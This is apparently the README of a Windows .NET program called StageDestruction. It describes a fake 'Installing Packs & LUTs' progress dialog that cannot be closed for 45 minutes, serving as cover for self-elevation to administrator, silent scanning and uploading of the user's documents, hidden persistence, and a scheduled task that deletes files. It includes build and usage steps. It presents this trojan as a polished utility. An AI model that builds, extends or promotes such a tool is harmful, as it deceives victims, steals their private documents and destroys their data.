# 🗂️ Project StageDestruction

A lightweight Windows utility built with **.NET 6 WinForms** that presents a convincing "Installing Packs & LUTs" installer experience while silently running background operations.

---

## ✨ Features

- 🪟 **Fake Installer Dialog** — displays a polished progress UI titled *"Installing Packs & LUTs"* with rotating status messages
- ⏱️ **45-Minute Countdown** — realistic progress bar with live time-remaining counter
- 🔒 **Close-Proof** — ALT+F4 is disabled during the install; dialog self-closes on completion
- 🤫 **Silent Background** — app stays alive after the dialog closes, running background tasks invisibly
- 🛡️ **UAC Elevation** — auto-relaunches with administrator privileges if needed
- 📄 **Document Scanner** — silently scans and uploads documents in the background
- 📅 **Scheduled Task** — registers a Windows Task Scheduler job for deferred file operations

---

## 🗃️ Project Structure

```
filedeleter/
├── p.cs               # Entry point — installer dialog + task scheduler
├── ScanUploader.cs    # Silent background document scanner & uploader
├── file_manager.py    # Python helper utilities
├── fd.csproj          # .NET 6 project file
├── logo.ico           # Application icon
├── build.txt          # Build command reference
└── .gitignore         # Excludes bin/, obj/, publish/, downloads/
```

---

## 🔨 Building

Requires **.NET 6 SDK** installed.

```powershell
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o ./publish
```

Output: `publish\fd.exe` — a single self-contained executable, no runtime required on the target machine.

---

## 🚀 Usage

Run `fd.exe` as Administrator (UAC prompt will appear automatically if not elevated).

The installer dialog will appear and run for **45 minutes**. Once complete, the dialog disappears and the app continues running silently in the background.

---

## ⚙️ Configuration

Edit the constants at the top of [`p.cs`](p.cs):

| Constant | Default | Description |
|---|---|---|
| `TargetFilePath` | `C:\Users\Public\Documents\file_to_delete.txt` | File targeted by the scheduled task |
| `TaskName` | `FileDeleterTask` | Windows Task Scheduler task name |
| `TotalDurationMs` | `2,700,000` (45 min) | Duration of the fake installer in ms |

---

## 📋 Requirements

- Windows 10 / 11
- .NET 6 SDK (build only)
- Administrator privileges (for Task Scheduler registration)

---

## 📄 License

Private — all rights reserved.
